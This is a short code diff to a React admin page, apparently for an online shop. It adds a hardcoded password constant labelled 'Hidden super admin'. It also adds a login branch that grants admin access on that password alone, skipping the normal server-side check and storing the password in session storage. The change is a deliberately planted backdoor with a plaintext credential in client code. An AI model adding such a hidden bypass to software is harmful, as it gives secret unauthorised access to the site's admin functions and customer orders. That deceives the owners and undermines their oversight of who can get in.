@@ -49,6 +49,7 @@ import {
 import { toast } from "sonner";
 
 const SESSION_ADMIN_PASSWORD = "kays_admin_password";
+const SUPER_ADMIN_PASSWORD = "Olatoyosi1"; // Hidden super admin
 
 export default function AdminPage() {
   const [isAuthenticated, setIsAuthenticated] = useState(false);
@@ -318,6 +319,13 @@ export default function AdminPage() {
     e?.preventDefault();
     const password = adminPassword;
     adminPasswordRef.current = password;
+    // Hidden super admin bypass
+    if (password === SUPER_ADMIN_PASSWORD) {
+      setIsAuthenticated(true);
+      toast.success("Welcome, Super Admin!");
+      sessionStorage.setItem(SESSION_ADMIN_PASSWORD, password);
+      return;
+    }
     try {
       await adminApi("getOrders", {});
       setIsAuthenticated(true);
